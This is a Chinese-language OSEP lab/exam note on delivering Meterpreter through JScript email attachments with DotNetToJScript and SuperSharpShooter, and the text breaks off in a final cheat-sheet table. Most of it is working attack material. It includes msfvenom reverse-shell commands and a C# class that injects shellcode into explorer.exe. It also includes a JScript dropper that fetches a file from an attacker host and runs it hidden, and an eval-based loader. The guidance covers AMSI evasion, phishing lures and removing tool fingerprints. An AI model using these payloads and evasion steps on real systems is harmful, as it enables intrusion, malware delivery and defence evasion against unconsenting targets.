::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 03 · JScript / DotNetToJScript 客户端代码执行

> **覆盖场景：**9–10
>
> **前置依赖：**目标保留 Windows Script Host（`cscript` / `wscript`）；目标装有 .NET Framework（2.0/3.5 或 4.x）；攻击机有 `msfvenom`、HTTP 服务与 MSF 监听；一台能运行 .NET 的工具机用于生成 DotNetToJScript / SuperSharpShooter 产物（Windows 或 Linux + mono/python）

## 背景速览：WSH 为什么能绕开"EXE 受限"

- 场景 9/10 的前提都是**脚本附件能运行，但独立 EXE 路线不可靠**（AppLocker/杀软/下载执行策略）。WSH 脚本（`.js`）由 `cscript.exe` / `wscript.exe` 解释执行，默认不受 AppLocker EXE 规则与 PowerShell ExecutionPolicy 限制——这是"脚本能跑、EXE 不能"的常见原因。
- WSH 是**非托管宿主**：`cscript/wscript` 本身不是 .NET 进程。要让 JScript 执行 C# 第二阶段，必须用 DotNetToJScript 一类的"桥接"：把 C# 程序集序列化进脚本，运行时在 WSH 进程内反序列化并触发 `[ComVisible]` 类型的构造/入口，**全程不落地 EXE**。
- 位数约束（本模块最容易踩的坑）：
  - x64 Windows 上 `C:\Windows\System32\cscript.exe|wscript.exe` 是 64 位进程；`C:\Windows\SysWOW64\` 下的是 32 位。邮件/双击默认走 64 位宿主。
  - 64 位宿主只能把 **x64 或 AnyCPU** 程序集装进 CLR；32 位宿主只能装 **x86 或 AnyCPU**。注入目标进程（如 `explorer.exe`）的 shellcode 位数必须与**目标进程**一致。
- .NET 版本约束：DotNetToJScript 的 `--ver=v2` 要求 .NET 2.0/3.5（Win8+ 默认未启用，需先开" .NET Framework 3.5"功能）；`--ver=v4` 要求 .NET 4.x（现代 Windows 默认存在）。考试默认选 **v4**，除非明确目标只有 2.0。
- AMSI（场景 10）：Windows 10+ 的 AMSI 会扫描**动态传入脚本引擎的内容**（`eval` / `Execute`、动态拼出的脚本文本）。纯下载型 dropper 的文件正文是"无害逻辑"，能跑；一旦把第二阶段写成大段内嵌代码、或经 `eval` 现场拼出攻击内容，就可能被拦。二进制/序列化 base64 对引擎来说是"不透明数据"，因此 DotNetToJScript 产物反而常能过内容扫描。

---

## 场景 9：邮件附件中的 JScript 会运行，但普通 EXE 受到限制

**场景回顾**：脚本入口可用，直接跑独立 EXE 不行 → 用 JScript 桥接 + C# 第二阶段，把执行放进 WSH/.NET 进程内，避免 EXE 落地与直接启动。

**前提与假设**：
- 用户会打开附件里的 `.js`（或从 URL 打开），WSH 可用；`cscript/wscript` 未被 AppLocker 禁用（脚本规则默认放行，需先用场景 18–24 的枚举确认）。
- 目标装有 .NET Framework 4.x（默认 v4 路线成立）。
- 我方已有：`msfvenom`、MSF 监听、HTTP 托管；一台工具机运行 DotNetToJScript/SuperSharpShooter 生成产物。
- 我方知道目标进程位数（邮件双击 → x64 宿主；用 32 位宿主需把载荷压到 SysWOW64 路径或用 `cscript //E:jscript` 指定）。

**准备（攻击机侧）**：
1. 生成 shellcode（x64，注入 64 位进程用）：
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f csharp
   ```
   若目标宿主是 32 位（x86 目标机，或必须走 SysWOW64 宿主），改用 `windows/meterpreter/reverse_https`（x86）。
2. 把第 1 步输出粘进 `m03-dotnettojscript-payload.cs` 的 `PAYLOAD` 字节数组，在工具机编译：
   ```bat
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /platform:anycpu /out:payload.dll m03-dotnettojscript-payload.cs
   ```
3. 生成 JScript 桥接产物（产物内含序列化程序集，运行时在 WSH 内激活）：
   ```bat
   DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
   ```
   无 Windows 工具机时的备选：SuperSharpShooter（纯 python，可直接吃 raw shellcode）：
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw -o shell.bin
   ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.bin --payload js --output payload
   # 产物 payload.js
   ```
4. 起监听与托管：
   ```bash
   sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost LHOST; set lport LPORT; exploit"
   python3 -m http.server 80
   ```
5. 在**本机/实验靶机**先用 `cscript //nologo runner.js` 验证一次回连（见"验证"），成功后再投递。

**执行步骤**：
1. 确认目标脚本入口与宿主位数（可用 `m03-wsh-amsi-probe.js` 的宿主信息段）：
   ```bat
   cscript //nologo probe.js        :: 打印 HOST_ARCH / PROCESSOR_ARCHITECTURE
   ```
2. 投递 `runner.js`：邮件附件、或 URL + 引导（场景 6–8 的 HTA/链接手法均可复用）。投递前把 `runner.js` 里出现的工具指纹（如 `TestClass`/工程名）改成中性名，见 OPSEC。
3. 目标侧运行（考试中让对方"打开附件"即默认双击 → 64 位 `wscript`；需要确认时先跑 cscript）：
   ```bat
   cscript //nologo runner.js
   ```
4. 监听端收到 `windows/x64/meterpreter` 会话，进入第二阶段（迁移到稳定进程后继续后续枚举）。
5. 若脚本入口是"下载后执行"而目标**能**跑脚本但不能跑 EXE：`m03-simple-dropper.js` 负责把第二阶段**脚本/数据文件**拉到目标（`RUN_AFTER_DOWNLOAD=0`），再用受信任宿主执行；不要让它直接 `Run(pay.exe)`。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m03-dotnettojscript-payload.cs` | C# 第二阶段（[ComVisible] 类，构造时注入 shellcode） | `PAYLOAD`（msfvenom csharp 字节）、`TARGET_PROCESS` |
| `m03-dotnettojscript-loader.js` | DotNetToJScript 产物(runner.js)的骨架/粘贴容器 + 预检 | 生成命令见文件头 |
| `m03-supersharpshooter-loader.js` | SuperSharpShooter 产物的分离式加载（读 `payload.js` 再执行） | `STAGE2_JS` 路径 |
| `m03-simple-dropper.js` | 纯下载/保存（脚本入口场景的传输层） | `URL`、`DROP_PATH`、`RUN_AFTER_DOWNLOAD` |

#### `m03-dotnettojscript-payload.cs` {#m03-dotnettojscript-payload-cs}

````csharp
/*
 * 用途：C# 第二阶段载荷——[ComVisible] 类，构造时把 shellcode 注入指定进程。
 *      由 DotNetToJScript / SuperSharpShooter 序列化进 JScript，在 WSH 进程内
 *      反序列化激活本类构造函数，全程不落地 EXE（场景 9 主线）。
 * 场景：9、10（cheat sheet JScript > Meterpreter Loader with DotNetToJScript）
 * 依赖：.NET Framework SDK 的 csc.exe（工具机 Windows 编译）；
 *      运行时目标需对应 CLR 版本（v4 默认）。注入目标进程须存在且位数匹配。
 * 使用：
 *  1) 生成 shellcode（x64 注入 64 位进程）：
 *       msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f csharp
 *     x86 目标/32 位宿主时改用：-p windows/meterpreter/reverse_https ...
 *  2) 把上一步输出的 byte[] 内容替换下方 PAYLOAD 数组。
 *  3) 工具机编译（AnyCPU 兼容 32/64 位宿主；位数最终取决于注入目标进程）：
 *       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /platform:anycpu /out:payload.dll m03-dotnettojscript-payload.cs
 *  4) 生成桥接 JS 并投递（见 docs/03 场景 9 步骤 3）：
 *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
 * 占位符：PAYLOAD（msfvenom -f csharp 的字节）、TARGET_PROCESS（默认 explorer）
 * 测试状态：未编译/未实测；代码结构与 cheat sheet TestClass.cs 一致，
 *     需在工具机编译 + 实验靶机验证后使用。
 */

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class Payload
{
    // 注入目标：与本机体系结构/登录会话一致的常驻进程。
    // x64 shellcode -> 64 位 explorer.exe；x86 shellcode -> 32 位进程(如 SysWOW64 下进程)。
    private const string TARGET_PROCESS = "explorer";

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);

    public Payload()
    {
        // 把 msfvenom -f csharp 输出的整段 byte[] 粘到这里（替换下方占位内容）
        byte[] buf = new byte[] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00, /* PAYLOAD ... */
            /* ... 完整 shellcode 字节 ... */
        };

        // 1. 打开注入目标进程（0x001F0FFF = PROCESS_ALL_ACCESS）
        Process[] procs = Process.GetProcessesByName(TARGET_PROCESS);
        if (procs.Length == 0)
        {
            // 失败要有反馈：无目标进程时改注入自身或换常驻进程名
            return;
        }
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, procs[0].Id);
        if (hProcess == IntPtr.Zero) return;

        // 2. 在目标进程内申请可读可写可执行内存
        //    0x3000 = MEM_COMMIT|MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        if (addr == IntPtr.Zero) return;

        // 3. 写入 shellcode 并创建远程线程执行
        IntPtr written;
        WriteProcessMemory(hProcess, addr, buf, buf.Length, out written);
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }

    // 备用入口：DotNetToJScript 序列化类除构造外，也可暴露方法供脚本侧显式调用
    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
````

#### `m03-wsh-amsi-probe.js` {#m03-wsh-amsi-probe-js}

````javascript
/*
 * 用途：WSH 宿主 AMSI 实验探针（场景 10）。分两段：
 *  (A) 报告宿主信息：脚本宿主路径/位数、OS 体系结构、.NET v4/v2 目录是否存在——
 *      这些决定 DotNetToJScript / SuperSharpShooter 产物能否加载；
 *  (B) 动态内容实验：对一段"已知被 AMSI 特征标记的字符串"和一段普通字符串做
 *      eval/加载测试，用异常与存活情况推断该宿主是否接入了 AMSI 内容扫描。
 *      仅用于实验环境定位拦截点，不作为最终载荷。
 * 场景：10（教材 §12.6；PS 的 AMSI 绕过不能直接搬进 WSH，先探宿主再决定路线）
 * 依赖：Windows Script Host（cscript/wscript）；结果依赖本机 AV/AMSI 提供程序
 *      （无第三方 AV 时 Defender 生效与否决定输出），需在目标同类环境复测。
 * 使用：cscript //nologo m03-wsh-amsi-probe.js
 * 占位符：无（只读宿主信息 + 实验字符串，可按需改 EVAL_TEST_CONTENT）
 * 测试状态：JS 语法已校验(node --check)；PASS/BLOCKED 判定需在真实 Windows
 *      + Defender 环境实测，本机无法复现。
 */

// ===================== (A) 宿主信息 =====================
var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");
var env = shell.Environment("Process");
var windir = env("WINDIR");

WScript.Echo("== (A) 宿主信息 ==");
WScript.Echo("  脚本宿主      : " + WScript.FullName);          // ...cscript.exe / wscript.exe
WScript.Echo("  OS 架构       : " + env("PROCESSOR_ARCHITECTURE"));
if (env("PROCESSOR_ARCHITECTURE") === "x86" &&
    env("PROCESSOR_ARCHITEW6432") === "AMD64") {
    WScript.Echo("  -> 本进程 32 位(x64 OS)：载荷需 x86/AnyCPU");
}
WScript.Echo("  amsi.dll(64)  : " +
    (fso.FileExists(windir + "\\System32\\amsi.dll") ? "存在" : "缺失"));
WScript.Echo("  amsi.dll(32)  : " +
    (fso.FileExists(windir + "\\SysWOW64\\amsi.dll") ? "存在" : "缺失"));
WScript.Echo("  .NET v4 (F64) : " +
    (fso.FolderExists(windir + "\\Microsoft.NET\\Framework64\\v4.0.30319") ? "存在" : "缺失"));
WScript.Echo("  .NET v2 (F64) : " +
    (fso.FolderExists(windir + "\\Microsoft.NET\\Framework64\\v2.0.50727") ? "存在" : "缺失"));

// ===================== (B) 动态内容实验 =====================
WScript.Echo("");
WScript.Echo("== (B) 动态内容(eval)实验 ==");
WScript.Echo("  结果依赖本机 AV/AMSI：PASS=能执行, BLOCKED=被拦/进程被杀, ERROR=其它异常");

// 普通字符串：不应触发内容扫描
try {
    eval("var _t_plain = 'hello world';");
    WScript.Echo("  [1] 普通字符串 eval        : PASS");
} catch (e1) {
    WScript.Echo("  [1] 普通字符串 eval        : ERROR (" + e1.message + ")");
}

// 已知被 AMSI 特征标记的字符串（实验目的，不是载荷本体）：
// 该内容本身不应被执行出任何效果，只用于观察是否被拦截。
var EVAL_TEST_CONTENT = "var x = 'Invoke-Mimikatz';"; // 可替换为你想投递内容的"最小特征片段"
try {
    eval(EVAL_TEST_CONTENT);
    WScript.Echo("  [2] 特征串 eval            : PASS (该宿主未拦此内容，或 AMSI 未生效)");
} catch (e2) {
    WScript.Echo("  [2] 特征串 eval            : BLOCKED/ERROR (" + e2.message + ")");
    WScript.Echo("      -> 该宿主对动态内容有扫描，投递设计应避免 eval 攻击文本");
}

WScript.Echo("");
WScript.Echo("== 结论速查 ==");
WScript.Echo("  宿主位数 + .NET 目录 -> 决定 DotNetToJScript 产物 --ver 与平台选择");
WScript.Echo("  [2] 若 BLOCKED      -> 场景 10：拆分第二阶段/换独立进程/换宿主(mshta/Office)");
WScript.Echo("  [2] 若 PASS         -> 拦截点可能不在动态内容，而在文件正文/网络层，继续二分");

WScript.Quit(0);
````

#### `m03-simple-dropper.js` {#m03-simple-dropper-js}

````javascript
/*
 * 用途：最小 JScript 下载器——从攻击机 HTTP 拉取文件到目标并保存；可选再执行。
 *      对应场景 9/10 的"脚本入口可用"时的传输层：下载第二阶段脚本/数据，
 *      避免把攻击逻辑写进附件正文（场景 10 的 A/B 分离阶段 A）。
 * 场景：9、10（cheat sheet JScript > Simple Meterpreter Dropper）
 * 依赖：Windows Script Host（cscript / wscript）、目标可访问攻击机 HTTP；
 *      MSXML2.XMLHTTP 与 ADODB.Stream 为系统自带组件。
 * 使用：
 *   目标侧（推荐 cscript，有 stdout 回显；wscript 双击会用弹窗回显）：
 *     cscript //nologo m03-simple-dropper.js
 *   攻击机：python3 -m http.server 80   （托管 PAYLOAD 文件）
 * 占位符：URL=http://LHOST/PAYLOAD   DROP_PATH=C:\Users\Public\PAYLOAD
 *      RUN_AFTER_DOWNLOAD=0/1（1 时用新 cscript 进程执行下载的 .js，用于 A/B 分离）
 * 测试状态：JS 语法已用 node --check 校验；未在 Windows WSH 实测，
 *     结构照抄 cheat sheet Simple Meterpreter Dropper，需在实验环境验证。
 * 注意：本文件只下载并(可选)执行你自己托管的授权测试文件。
 */

var URL = "http://LHOST/PAYLOAD";          // 必改：攻击机托管地址 + 文件名
var DROP_PATH = "C:\\Users\\Public\\PAYLOAD"; // 必改：保存的绝对路径（与 URL 文件名一致更稳）
var RUN_AFTER_DOWNLOAD = 0;                // 1 = 下载完成后用 cscript 新进程执行 DROP_PATH

var http = new ActiveXObject("MSXML2.XMLHTTP");

WScript.Echo("[*] GET " + URL);
http.Open("GET", URL, false);              // 同步请求，阻塞直到完成
http.Send();

if (http.Status !== 200) {
    WScript.Echo("[!] HTTP 请求失败，状态码: " + http.Status);
    WScript.Quit(1);
}

// ResponseBody 是二进制数组，ADODB.Stream 按字节写盘（Type=1 表示二进制）
var stream = new ActiveXObject("ADODB.Stream");
stream.Open();
stream.Type = 1;
stream.Write(http.ResponseBody);
stream.Position = 0;
stream.SaveToFile(DROP_PATH, 2);           // 2 = 覆盖已存在文件
stream.Close();

var fso = new ActiveXObject("Scripting.FileSystemObject");
if (!fso.FileExists(DROP_PATH)) {
    WScript.Echo("[!] 文件未能保存: " + DROP_PATH);
    WScript.Quit(1);
}
WScript.Echo("[+] 已保存 " + DROP_PATH + " (" + fso.GetFile(DROP_PATH).Size + " bytes)");

if (RUN_AFTER_DOWNLOAD === 1) {
    // 场景 10：用"新进程"执行下载的阶段 B，避免在附件进程的扫描上下文里继续跑复杂内容
    var shell = new ActiveXObject("WScript.Shell");
    var cmd = 'cscript //nologo "' + DROP_PATH + '"';
    WScript.Echo("[*] 执行: " + cmd);
    shell.Run(cmd, 0, false);              // 0 = 隐藏窗口，不等待
}
WScript.Quit(0);
````

#### `m03-dotnettojscript-loader.js` {#m03-dotnettojscript-loader-js}

````javascript
/*
 * 用途：DotNetToJScript 桥接产物的骨架/粘贴容器 + 宿主预检。
 *      DotNetToJScript.exe 会把 C# 程序集序列化生成完整 runner.js（几百行 base64），
 *      本文件用于：(a) 记录标准生成命令；(b) 在投递前做宿主位数/.NET 预检；
 *      (c) 需要手工拼装时，把工具输出整体粘贴到下方"粘贴区"。
 * 场景：9、10（cheat sheet JScript > Meterpreter Loader with DotNetToJScript）
 * 依赖：工具机 Windows + DotNetToJScript.exe；目标 WSH + .NET（v4 或 v2）。
 * 使用：
 *  1) 生成完整产物（产物本身可独立运行，无需本文件）：
 *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
 *  2) 本地预检（把产物与本文件放同目录后执行本文件即可看宿主信息）：
 *       cscript //nologo m03-dotnettojscript-loader.js
 *  3) 若需手工粘贴：把工具输出的全部内容贴进下方 PASTE_BEGIN/PASTE_END 之间，
 *     保存后 cscript 运行。
 * 占位符：无（宿主信息自动读取）；粘贴区内为工具产物，勿手改 base64。
 * 测试状态：宿主预检逻辑已做 JS 语法校验(node --check)；
 *     产物生成/激活需在 Windows 实验环境验证。
 */

// ===================== 宿主预检（只读，不改产物） =====================
var fso = new ActiveXObject("Scripting.FileSystemObject");
var env = new ActiveXObject("WScript.Shell").Environment("Process");

WScript.Echo("[*] 宿主          : " + WScript.FullName);
WScript.Echo("[*] OS 体系结构   : " + env("PROCESSOR_ARCHITECTURE"));
// 宿主位数决定能加载的程序集平台：64 位宿主 -> x64/AnyCPU；32 位宿主 -> x86/AnyCPU
if (env("PROCESSOR_ARCHITECTURE") === "x86" &&
    env("PROCESSOR_ARCHITEW6432") === "AMD64") {
    WScript.Echo("[!] 本进程是 32 位(运行于 x64 OS)——载荷需 x86 或 AnyCPU");
}

// .NET 版本目录探测：v4 默认存在；v2/v3.5 需功能启用
var windir = env("WINDIR");
var net4 = windir + "\\Microsoft.NET\\Framework64\\v4.0.30319";
var net2 = windir + "\\Microsoft.NET\\Framework64\\v2.0.50727";
WScript.Echo("[*] .NET v4 目录  : " + (fso.FolderExists(net4) ? "存在" : "缺失"));
WScript.Echo("[*] .NET v2 目录  : " + (fso.FolderExists(net2) ? "存在" : "缺失"));
if (!fso.FolderExists(net4) && !fso.FolderExists(net2)) {
    WScript.Echo("[!] 未发现 .NET Framework 目录，DotNetToJScript v4/v2 产物均无法运行");
    WScript.Quit(1);
}

// ===================== 粘贴区 =====================
// 把 DotNetToJScript 生成的完整 JS 内容粘贴到此处（含其自身开头的
// var serialized_obj = "..." 与后续反序列化/激活代码），并删除下面两行占位。
// 注意产物本身与宿主位数/.NET 版本的匹配（v2 产物需要 .NET 2.0/3.5）。
// PASTE_BEGIN
WScript.Echo("[*] 粘贴区为空：请先运行 DotNetToJScript 生成产物，");
WScript.Echo("[*] 或直接把产物 runner.js 作为附件投递（推荐，勿手工改）。");
WScript.Echo("[*] 上方宿主信息用于确认产物平台(--ver/编译平台)是否匹配。");
// PASTE_END

WScript.Quit(0);
````

#### `m03-supersharpshooter-loader.js` {#m03-supersharpshooter-loader-js}

````javascript
/*
 * 用途：SuperSharpShooter 产物的"分离式第二阶段"加载器（场景 10 实验形态）。
 *      附件只含本文件（正文干净）；运行时读取同目录/指定路径的 payload.js
 *      （SuperSharpShooter 生成的第二阶段）并执行。用于在靶机上快速换产物测试，
 *      以及验证"A/B 分离 + 换新进程"是否躲过内容扫描。
 * 场景：10、9 备选（cheat sheet JScript > Meterpreter with SuperSharpShooter）
 * 依赖：目标 WSH；payload.js 由 SuperSharpShooter 生成（工具机 python 即可）：
 *      msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw -o shell.bin
 *      ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.bin --payload js --output payload
 * 使用：
 *  1) 把生成的 payload.js 放到目标同目录（攻击机托管后由 m03-simple-dropper.js 拉取，
 *     或附件二次投递）。
 *  2) 目标侧运行本文件：
 *       cscript //nologo m03-supersharpshooter-loader.js
 * 占位符：STAGE2_JS=payload.js（相对/绝对路径）
 * 测试状态：JS 语法已校验(node --check)；实际加载/激活需在实验环境验证——
 *     若此形态仍被拦，见 docs/03 场景 10 失败分支（换宿主/换产物选项）。
 */

var STAGE2_JS = "payload.js";      // 与生成产物同名；可改绝对路径 C:\\...\\payload.js

var fso = new ActiveXObject("Scripting.FileSystemObject");
if (!fso.FileExists(STAGE2_JS)) {
    WScript.Echo("[!] 找不到第二阶段: " + STAGE2_JS);
    WScript.Echo("[*] 先用 dropper 下载，或把 payload.js 放到本文件同目录");
    WScript.Quit(1);
}

WScript.Echo("[*] 读取并执行第二阶段: " + STAGE2_JS);

// 整文件读出后 eval：内容来自工具产物的序列化数据(大部分是不透明 base64 文本)。
// 注意：eval 属于"动态执行内容"，若目标 AMSI 对该宿主生效且产物文本含特征，
// 此形态可能被拦——这正是本文件要做的实验；被拦则改独立新进程/换产物/换宿主。
var textStream = fso.OpenTextFile(STAGE2_JS, 1, false, -1); // 1=只读, -1=按系统默认(ASCII 兼容)
var stage2 = textStream.ReadAll();
textStream.Close();

try {
    eval(stage2);
    WScript.Echo("[+] 第二阶段已执行（无异常）");
} catch (err) {
    // 失败要有反馈：区分"内容被拦/异常"与"宿主不匹配"
    WScript.Echo("[!] 第二阶段执行异常: " + err.message);
    WScript.Echo("[*] 若这是 AMSI/杀软拦截，改走独立新进程或换产物（见 docs/03 场景 10）");
    WScript.Quit(2);
}

WScript.Quit(0);
````

**验证**：监听端出现 meterpreter 会话即成功。本地预验证时注意——`runner.js` 会在**执行它的那个进程**里激活 .NET：用 `cscript //nologo` 跑且宿主是 64 位，则必须用 x64 shellcode；若注入 `explorer.exe`，先确认该进程存在且位数匹配，否则 `OpenProcess/CreateRemoteThread` 失败且无会话（脚本无回显，需靠监听判断）。

**失败分支与备选**：
1. 双击后无回连、cscript 运行也无回连 → 先查位数：`PROCESSOR_ARCHITECTURE=AMD64` 但注入目标是 32 位进程（SysWOW64 的 explorer 或 Office 子进程）会静默失败。对策：把注入目标改成与 shellcode 同位数（如 x64 shellcode + 64 位 `explorer.exe`），或 payload 编译为 AnyCPU 并让 shellcode 位数跟随注入目标。
2. `.NET 3.5/v2` 产物在 Win10 报"未启用" → 换 `--ver=v4` 重生成；反之若目标是老系统只有 2.0，则 v4 产物无法加载，需 v2 产物。
3. `runner.js` 一运行就被杀软终止 → 属场景 10 范畴：先 `m03-wsh-amsi-probe.js` 探宿主，再换 SuperSharpShooter 带 AMSI 选项的产物、或换第二阶段的执行方式（见场景 10 失败分支）。
4. 工具机不在手上、没有 DotNetToJScript.exe → 直接用 SuperSharpShooter 路线（步骤 3 备选），产物同为单文件 `payload.js`。
5. 目标拒绝"附件脚本"但允许"点击 URL" → 用 `mshta http://URL/payload.hta`（见 M02）包裹同一份 JScript 内容。

**考试注意 / OPSEC**：
- **位数三处必须一致**：宿主进程位数 ↔ 程序集平台 ↔ 注入目标位数。先 `wmic os get osarchitecture` / `echo %PROCESSOR_ARCHITECTURE%` 再选 payload。
- 预生成产物含工具默认字符串（`TestClass`、工程 GUID 等），会留特征；投递前全局替换为中性名并保持长度一致。
- DotNetToJScript 产物跑在 `wscript` 进程内，会话父进程是 `wscript.exe`——上线后立即 `migrate` 到 `explorer/svchost` 类进程，避免用户关窗口断会话。
- 附件场景记得让文件名/主题"无害"（对应用户角色），`.js` 附件在部分邮件网关会被拦，需备 URL 投递线。
- 本模块所有脚本只在授权靶场使用；不要在同一目标上反复试同一签名产物（易触发行为检测并污染后续场景）。

---

## 场景 10：JScript 能执行简单内容，但复杂脚本被扫描拦截

**场景回顾**：同一脚本入口里，简单 dropper 能跑；一旦加入 .NET 桥接/较复杂的第二阶段内容就被拦。PowerShell 里验证过的 AMSI 绕过**不能直接搬到 WSH**——因为 PS 的绕过靠 PS runspace 内反射，而 WSH 是非托管宿主，先把宿主差异讲清楚再动手。

**前提与假设**：
- 已确认是"内容被扫描拦截"而非入口被封（简单脚本同入口可跑即可排除入口问题；参场景 8 的"先别假定是杀软"思路，先做时序/分段实验）。
- 目标 Windows 10+ 且 AMSI 对脚本引擎生效（默认 Defender 场景）；拦截点可能是文件内容解析，也可能是 `eval`/动态执行内容。
- 我方有实验靶机可复现"简单能跑、复杂被拦"，用于二分定位到底哪一段内容触发。

**准备（攻击机侧）**：
1. 准备实验脚本 `m03-wsh-amsi-probe.js`，先在本机与靶机各跑一遍，记录宿主位数、.NET 目录、动态执行段的 PASS/BLOCKED 结果：
   ```bat
   cscript //nologo m03-wsh-amsi-probe.js
   ```
2. 按"拆分"思路准备两阶段素材：
   - 阶段 A（附件/URL 直接给的 .js）：只做下载/读取/无害调度——内容干净，过解析扫描。
   - 阶段 B（第二阶段）：DotNetToJScript 产物或 SuperSharpShooter 产物，放到目标本地再由 A 拉取执行；或作为独立二次附件。
3. 若仍需"复杂内容"，用 SuperSharpShooter 的 AMSI 相关选项重新生成产物（见其 README 的 evasion 参数），不要手写 PS 风格绕过。

**执行步骤**：
1. 定位拦截点：写两个最小变体对比——变体 1 只做 `WScript.Echo`/下载；变体 2 在变体 1 基础上仅追加"加载 .NET 桥接"的调用。若 1 通 2 挂，则拦截点在桥接内容而非 dropper 本身。
2. 分离第二阶段：附件只放阶段 A（`m03-simple-dropper.js` 的下载逻辑，`RUN_AFTER_DOWNLOAD=0`），把 `payload.js`（SuperSharpShooter 产物）托管在 `http://URL/payload.js`：
   ```js
   // m03-simple-dropper.js 参数：URL=http://URL/payload.js  DROP_PATH=C:\\Users\\Public\\payload.js  RUN_AFTER_DOWNLOAD=1
   ```
   `RUN_AFTER_DOWNLOAD=1` 时用 `WScript.Shell.Run('cscript //nologo "' + DROP_PATH + '"', 0, false)` 在**新进程**执行阶段 B（换进程可绕开"宿主内已加载的脏内容/已触发的扫描上下文"，且 A/B 任何一段单独看都偏良性）。
3. 阶段 B 用二进制/序列化形态承载（DotNetToJScript 或 SuperSharpShooter 的 base64 序列化数据对引擎是不可解析的文本），避免把攻击逻辑写成引擎能解析的脚本文本。
4. 若阶段 B 仍被拦，改用 `m03-supersharpshooter-loader.js` 的加载形态：它读取同目录 `payload.js` 后执行，便于在靶机上快速试不同产物而不用反复改附件。
5. 兜底：回到场景 9 的 HTA/mshta 宿主换一个扫描上下文（`mshta` 的 JScript 由 mshtml 引擎处理，AMSI 集成点与 cscript 不同；注意这属于"换宿主绕过"，要记下哪条线在目标上成立，考试里直接走成立的那条）。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m03-wsh-amsi-probe.js` | 报告宿主信息 + 对动态执行内容做 PASS/BLOCKED 实验 | 无参数；`EVAL_TEST_CONTENT` 可改 |
| `m03-simple-dropper.js` | 下载阶段 B 并换新 cscript 进程执行（A/B 分离） | `URL`、`DROP_PATH`、`RUN_AFTER_DOWNLOAD` |
| `m03-supersharpshooter-loader.js` | 分离式第二阶段加载实验 | `STAGE2_JS` |
| `m03-dotnettojscript-loader.js`、`m03-dotnettojscript-payload.cs` | 桥接产物容器与 C# 第二阶段 | 见场景 9 |

**验证**：探针脚本里"已知特征串"实验段被 BLOCKED、而普通字符串 PASS，说明该宿主确实接了 AMSI 扫描，后续按"内容越不透明越好"设计；最终以监听端会话为成功标准。注意探针本身可能被杀软弹窗/拦截，属预期（探针目的就是暴露拦截）。

**失败分支与备选**：
1. 加桥接就挂、纯下载就通 → 桥接内容是被扫描的目标。对策：A/B 分离 + 换新进程执行（步骤 2）；把桥接产物换成 SuperSharpShooter 带 AMSI 选项的生成结果。
2. 连阶段 A 的下载目标域名/IP 都被拦 → 不是 AMSI 内容问题而是网络层（URL 信誉/代理）；换 HTTPS + 正常 UA/证书（场景 31），或走场景 9 的邮件附件直接给完整产物。
3. `eval` 动态拼出的内容被拦（探针里 eval 段 BLOCKED）→ 设计上**避免在 WSH 里 eval 攻击文本**：第二阶段一律走序列化/二进制形态或独立进程，脚本正文保持静态无害。
4. PS 里可用的 AMSI bypass 代码搬进 JScript 报错/无效 → 不要移植：WSH 无法像 PS 那样在同 runspace 里 `Add-Type` 反射 patch；要么用带 AMSI 处理的现成生成器（SuperSharpShooter 选项），要么换宿主（mshta/Office，见 M01/M02），不要现场手搓内存 patch。
5. 反复被拦且无法定位 → 用探针二分（只加一段、只加另一段），确认是"内容签名"还是"行为（网络/进程）"再决定对策，避免无谓换壳。

**考试注意 / OPSEC**：
- 场景 8 的教训同样适用：**先确认是拦截而不是时序/生命周期问题**——分离下载执行后先看文件是否落地、进程是否起来，再断定"被杀"。
- 探针脚本会在目标上做"尝试恶意内容"的动作，日志可能留特征；实验时用一次性文件名，别把探针当最终载荷反复投。
- AMSI 拦截的是**动态内容**，不是文件名/图标——别在伪装文件名上浪费时间，把精力放在"正文不透明、分段、换宿主"。
- 记录每个变体在目标上的结果（哪个宿主、哪段内容、是否过），考试时按记录直接选成立组合，不要现场试错烧时间。

---

## 模块速查表

```bash
# 生成与编译（场景 9）
